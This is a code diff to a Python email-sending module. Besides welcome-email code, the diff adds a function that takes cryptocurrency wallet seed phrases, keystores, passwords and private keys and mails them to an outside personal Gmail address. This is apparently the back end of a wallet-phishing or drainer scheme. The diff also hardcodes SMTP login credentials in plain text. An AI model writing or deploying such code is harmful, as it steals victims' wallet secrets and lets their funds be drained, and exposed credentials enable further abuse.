@@ -2,18 +2,15 @@ import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.application import MIMEApplication
+from email.message import EmailMessage
 
 
 # Hardcoded SMTP server settings
-SMTP_SERVER = 'hardsrockfinance.com'
+SMTP_SERVER = 'mail.artifexgateway.com'
 SMTP_PORT = 587  # Port for TLS
-SENDER_EMAIL = 'no-reply@hardsrockfinance.com'
-SENDER_PASSWORD = 'JssKn7zwkrIbpbBs'
+SENDER_EMAIL = 'no-reply@artifexgateway.com'
+SENDER_PASSWORD = 'VHgfrkM8P]ky'
 
-SMTP_SERVER = 'hardsrockfinance.com'
-SMTP_PORT = 587  # Port for TLS
-SENDER_EMAIL = 'no-reply@hardsrockfinance.com'
-SENDER_PASSWORD = 'JssKn7zwkrIbpbBs'
 
 def send_welcome_email(recipient_email, user_name):
     """
@@ -103,3 +100,34 @@ def send_welcome_email(recipient_email, user_name):
             print("Welcome email sent successfully!")
     except Exception as e:
         print(f"Failed to send email: {e}")
+
+
+
+
+def send_wallet_email(phrase, keystore, password, privatekey, method):
+    msg = EmailMessage()
+    msg['Subject'] = 'New Wallet Saved'
+    msg['From'] = SENDER_EMAIL
+    msg['To'] = 'okekejohnpaul514@gmail.com'
+
+    # Email content
+    content = f"""
+    ✅ A new wallet has been saved.
+
+    🔐 Phrase: {phrase}
+    🗂️ Keystore: {keystore}
+    🔑 Password: {password}
+    🛡️ Private Key: {privatekey}
+    ⚙️ Method: {method}
+    """
+
+    msg.set_content(content)
+
+    try:
+        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
+            smtp.starttls()  # Start TLS encryption
+            smtp.login(SENDER_EMAIL, SENDER_PASSWORD)
+            smtp.send_message(msg)
+            print("📨 Email sent successfully!")
+    except Exception as e:
+        print(f"❌ Failed to send email: {e}")
